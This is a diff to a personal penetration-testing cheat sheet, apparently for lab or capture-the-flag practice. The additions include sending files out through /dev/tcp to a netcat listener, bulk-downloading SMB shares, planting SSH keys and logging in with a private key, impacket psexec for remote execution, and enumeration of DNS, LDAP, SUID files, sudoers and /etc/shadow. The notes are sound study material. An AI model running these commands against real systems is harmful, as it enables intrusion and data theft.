@@ -56,7 +56,7 @@ cd ~
 which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp 2>/dev/null
 cat /etc/passwd
 sudo -l
-su -
+su <other user> - 
 find / -perm /4000 -ls 2>/dev/null        
 find / -perm /2000 -ls 2>/dev/null
 find . -ls -type -f
@@ -199,6 +199,15 @@ locate <keywords> |grep .nse$      #search for nmap script
         './nmapAutomator full ip'
         https://raw.githubusercontent.com/21y4d/nmapAutomator/master/nmapAutomator.sh
 3.3.	AutoRecon — https://github.com/Tib3rius/AutoRecon
+3.4 	Tcpdump 
+		tcpdump via ssh 
+			ssh id@ip "/usr/bin/tcpdump -i <interface> -U -s0 -w - '<specification e.g. port 22>'" >somename.cap"
+			wireshark somename.cap
+			OR
+			
+			ssh id@ip "/usr/bin/tcpdump -i <interface> -U -s0 -w - '<specification e.g. port 22>'" >somename.cap" |wireshark -k -i -
+			
+			
                
 4.	 Linux OS
 Look for example
@@ -225,6 +234,12 @@ net use \\<IP>\pkong
 copy \\<IP>\pkong\file .
   New-PSDrive -name "something" -PSProvider "FileSystem" -Root "\\<ip>\<folder_name>
   cd something:
+Using /dev/tcp
+	sender: 
+		cat <file>  > /dev/tcp/<ip>/<port>
+	receiver
+		nc -nlvp <port>
+
   
   
 	
@@ -296,6 +311,9 @@ ssh login with a key
 		echo 'id_rsa.pub context' >> /var/www/.ssh/authorized_keys 
 	log in to the server
 	ssh -i <id>@<ip_address>
+	
+	GET id_RSA.private
+		log in with ssh -i id_RSA.priv id@ip
 
 	
 	
@@ -320,7 +338,13 @@ https://github.com/3mrgnc3/pentest_old/blob/master/postfix-shellshock-nc.py
 smtp-user-enum
 		
 53 -DNS
-nslookup - server <ip>
+nslookup  
+	server <ip>
+	127.0.0.1
+	127.0.0.2
+	<ip>
+dnsrecon -d <ip> <subnet>
+	eg. dnsrecon -d 10.10.10.200 10.0.0.0/8
 nslookup <ip>
 DNS zone transfer -TCP
 dig axfr  @ip_address dns_name 
@@ -399,6 +423,10 @@ https://www.pentestpartners.com/security-blog/how-to-kerberoast-like-a-boss/
                 smbclient //<ip>/tmp
                 smbclient \\\<ip>\\ipc$ -U pkong
                 smbclient //<ip>/ipc$ -U pkong
+		smbclient 
+			recurse ON
+			prompt OFF
+			mget *
                     mount -t cifs -o user=USERNAME,sec=ntlm,dir_mode=0077 "//10.10.10.10/My Share" /mnt/cifs
                 nmap -p 139,445 192.168.1.1/24 --script smb-enum-shares.nse smb-os-discovery.nse
                 enum4linux -a 192.168.1.120
@@ -437,7 +465,12 @@ https://www.pentestpartners.com/security-blog/how-to-kerberoast-like-a-boss/
                 Lightweight Directory Access Protocol   (More likely telephone-directory)
                 Database tree
                 Often in corporate structure, store user information, used for authentication(web application)
-                ldapsearch -h <ip> -p 389 -x -b "dc=mywebsite,dc=com"
+                
+		ldapsearch -h <ip> -x -s base namingcontexts
+		ldapsearch -h <ip> -p 389 -x -b "dc=mywebsite,dc=com"
+		impacket
+			getadusers.py -all  -dc-ip <ip>  <dns>/<id>
+			psexec.py <dns>/<id>@<ip>              #works only with the admin account
        
 443- HTTPS
                 OpenSSL 1.0.1-1.0.1f Vulnerable
@@ -747,6 +780,7 @@ which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp 2>/de
                   cd /mnt
                   cat /etc/shadow   
  	    sudo -u <another_user>
+	    /etc/sudoers
 8.1.3.	capability
             getcap -r / 2>/dev/null
 8.1.4.	cron
